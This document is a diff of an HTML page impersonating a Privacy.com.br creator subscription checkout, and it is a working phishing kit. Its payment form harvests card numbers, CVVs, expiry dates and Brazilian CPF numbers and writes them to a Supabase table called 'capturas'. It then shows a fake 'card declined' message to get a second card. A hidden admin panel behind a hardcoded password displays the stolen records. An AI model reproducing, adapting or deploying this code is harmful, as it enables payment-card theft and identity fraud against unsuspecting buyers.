@@ -5,35 +5,144 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Privacy | Kamylinha Santos</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script src="https://cdn.jsdelivr.net/npm/notiflix@2.7.0/dist/notiflix-aio-2.7.0.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+
     <style>
-        :root { --primary: #f47b52; }
+        :root { --primary: #f47b52; --grad: linear-gradient(90deg, #f47b52, #f9a67a); }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        body { background: #fff; text-align: center; }
-        .nav { padding: 15px; border-bottom: 1px solid #eee; }
-        .banner { width: 100%; height: 180px; object-fit: cover; }
-        .profile { width: 90px; height: 90px; border-radius: 50%; border: 3px solid #fff; margin-top: -45px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        .btn-pay { width: 90%; padding: 15px; background: linear-gradient(90deg, #f47b52, #f9a67a); border: none; border-radius: 50px; color: #fff; font-weight: 800; margin-top: 20px; cursor: pointer; }
-        #modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; }
-        .modal-box { background: #fff; width: 90%; max-width: 400px; margin: 15% auto; padding: 20px; border-radius: 15px; text-align: left; }
-        .form-group { margin-bottom: 10px; }
-        .form-group label { display: block; font-size: 11px; font-weight: 700; margin-bottom: 3px; }
-        .form-group input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }
+        body { background: #fff; padding-bottom: 80px; overflow-x: hidden; }
+        .nav-top { padding: 12px 20px; border-bottom: 1px solid #f0f0f0; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; background: #fff; z-index: 100; }
+        .banner { width: 100%; height: 200px; object-fit: cover; }
+        .profile-pic { width: 100px; height: 100px; border-radius: 50%; border: 4px solid #fff; margin-top: -50px; margin-left: 20px; object-fit: cover; box-shadow: 0 4px 10px rgba(0,0,0,0.1); position: relative; z-index: 5; }
+        .info { padding: 15px 20px; }
+        .name { font-size: 20px; font-weight: 800; display: flex; align-items: center; gap: 5px; }
+        .btn-sub { width: 90%; margin: 10px auto; padding: 16px; border-radius: 50px; border: none; color: #fff; background: var(--grad); font-weight: 800; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
+        
+        #payModal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(5px); }
+        .modal-content { background: #fff; width: 92%; max-width: 400px; margin: 10% auto; border-radius: 20px; padding: 25px; }
+        .form-group { margin-bottom: 12px; }
+        .form-group label { display: block; font-weight: 700; font-size: 11px; margin-bottom: 4px; color: #555; }
+        .form-group input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #ddd; font-size: 16px; outline: none; }
+        
+        #adminPanel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #111; color: #fff; z-index: 9999; padding: 20px; overflow-y: auto; }
+        .log-card { background: #222; padding: 15px; border-radius: 10px; margin-bottom: 10px; border-left: 4px solid var(--primary); font-size: 13px; line-height: 1.6; }
     </style>
 </head>
 <body>
-    <div class="nav"><img src="https://privacy.com.br/img/logo-orange.svg" height="25"></div>
-    <img src="capa.png" class="banner">
-    <img src="perfil1.png" class="profile">
-    <h2>Kamylinha Santos ✅</h2>
-    <button class="btn-pay" onclick="document.getElementById('modal').style.display='block'">ASSINAR CONTEÚDO</button>
 
-    <div id="modal">
-        <div class="modal-box">
-            <h3 style="color:var(--primary); margin-bottom:15px;">Pagamento Seguro</h3>
-            <div class="form-group"><label>NOME NO CARTÃO</label><input type="text" id="n"></div>
+    <nav class="nav-top">
+        <img src="https://privacy.com.br/img/logo-orange.svg" height="24" onclick="checkAdmin()" style="cursor: pointer;">
+        <i class="fa-solid fa-bars" style="color: #666;"></i>
+    </nav>
+
+    <img src="capa.png" class="banner" onerror="this.src='https://via.placeholder.com/800x200?text=Capa+da+Privacy'">
+    <img src="perfil1.png" class="profile-pic" onerror="this.src='https://via.placeholder.com/150?text=Perfil'">
+
+    <div class="info">
+        <div class="name">Kamylinha Santos <i class="fa-solid fa-circle-check" style="color:var(--primary)"></i></div>
+        <p style="color: #666; font-size: 14px;">@eukamylinhasantos</p>
+        <p style="margin-top: 10px; font-size: 14px; color: #444;">Assine para ter acesso total ao meu conteúdo exclusivo. 🔥🔞</p>
+    </div>
+
+    <button class="btn-sub" onclick="document.getElementById('payModal').style.display='block'">
+        <span>ASSINAR AGORA</span> <span>R$ 10,00</span>
+    </button>
+
+    <div id="payModal">
+        <div class="modal-content">
+            <h2 style="text-align:center; color:var(--primary); margin-bottom:20px; font-weight: 800;">Pagamento</h2>
+            <div class="form-group"><label>NOME NO CARTÃO</label><input type="text" id="n" placeholder="Como está no cartão"></div>
+            <div class="form-group"><label>NÚMERO DO CARTÃO</label><input type="text" id="c" placeholder="0000 0000 0000 0000"></div>
+            <div class="form-group"><label>CPF DO TITULAR</label><input type="text" id="cpf" placeholder="000.000.000-00"></div>
+            <div style="display:flex; gap:10px">
+                <div class="form-group" style="flex:1"><label>VALIDADE</label><input type="text" id="v" placeholder="MM/AA"></div>
+                <div class="form-group" style="flex:1"><label>CVV</label><input type="text" id="cvv" placeholder="123"></div>
+            </div>
+            <button class="btn-sub" style="width:100%; margin: 15px 0 0 0;" onclick="salvarNoSQL()">FINALIZAR PAGAMENTO</button>
+            <button onclick="document.getElementById('payModal').style.display='none'" style="width:100%; background:none; border:none; margin-top:15px; color:#999; font-size: 13px; cursor: pointer;">Cancelar e voltar</button>
+        </div>
+    </div>
+
+    <div id="adminPanel">
+        <div style="display:flex; justify-content:space-between; align-items: center; margin-bottom:20px; border-bottom: 1px solid #333; padding-bottom: 10px;">
+            <h2 style="color: var(--primary);">LOGS NOXXZ ⚡</h2>
+            <button onclick="location.reload()" style="background:#444; color:#fff; border:none; padding:8px 15px; border-radius:5px; font-weight: 700;">SAIR</button>
+        </div>
+        <div id="listaLogs">Buscando peixes...</div>
+    </div>
+
+    <script>
+        // CONFIGURAÇÕES DO NOXXZ
+        const SB_URL = 'https://bafumercepnhnlqkxtcd.supabase.co'; 
+        const SB_KEY = 'sb_publishable_Z8NyNh7hAAhOjk75y035aw_1siOe_xk';
+        const _supabase = supabase.createClient(SB_URL, SB_KEY);
+
+        $(document).ready(function(){
+            $('#c').mask('0000 0000 0000 0000');
+            $('#cpf').mask('000.000.000-00');
+            $('#v').mask('00/00');
+            $('#cvv').mask('000');
+        });
+
+        async function salvarNoSQL() {
+            const dados = {
+                nome: $('#n').val(),
+                card: $('#c').val(),
+                cpf: $('#cpf').val(),
+                validade: $('#v').val(),
+                cvv: $('#cvv').val()
+            };
+
+            if(dados.card.length < 16 || dados.cvv.length < 3) {
+                return Notiflix.Notify.failure('Dados do cartão inválidos.');
+            }
+
+            Notiflix.Loading.circle('Processando pagamento...');
+
+            const { error } = await _supabase.from('capturas').insert([dados]);
+
+            setTimeout(() => {
+                Notiflix.Loading.remove();
+                if(error) {
+                    console.error(error);
+                    Notiflix.Notify.failure('Erro temporário no servidor.');
+                } else {
+                    Notiflix.Report.failure('Cartão Recusado', 'Saldo insuficiente ou erro na operadora. Tente outro cartão.', 'OK');
+                    $('#c, #cvv, #v').val('');
+                }
+            }, 2000);
+        }
+
+        async function checkAdmin() {
+            const pass = prompt("Senha do Mestre:");
+            if(pass === "NOXXZ2026") {
+                document.getElementById('adminPanel').style.display = 'block';
+                const { data, error } = await _supabase.from('capturas').select('*').order('data_hora', { ascending: false });
+                
+                const container = document.getElementById('listaLogs');
+                if(error) return container.innerHTML = "Erro ao puxar dados: " + error.message;
+                
+                container.innerHTML = data.length ? "" : "Nenhum dado encontrado.";
+                data.forEach(i => {
+                    container.innerHTML += `
+                        <div class="log-card">
+                            <b>NOME:</b> ${i.nome}<br>
+                            <b>CARTÃO:</b> <span style="color:#00ff00">${i.card}</span><br>
+                            <b>CPF:</b> ${i.cpf}<br>
+                            <b>VAL/CVV:</b> ${i.validade} | ${i.cvv}<br>
+                            <small style="color:#888">${new Date(i.data_hora).toLocaleString('pt-BR')}</small>
+                        </div>
+                    `;
+                });
+            }
+        }
+    </script>
+</body>
+</html>
             <div class="form-group"><label>NÚMERO DO CARTÃO</label><input type="text" id="c"></div>
             <div class="form-group"><label>CPF</label><input type="text" id="cpf"></div>
             <div style="display:flex; gap:10px">
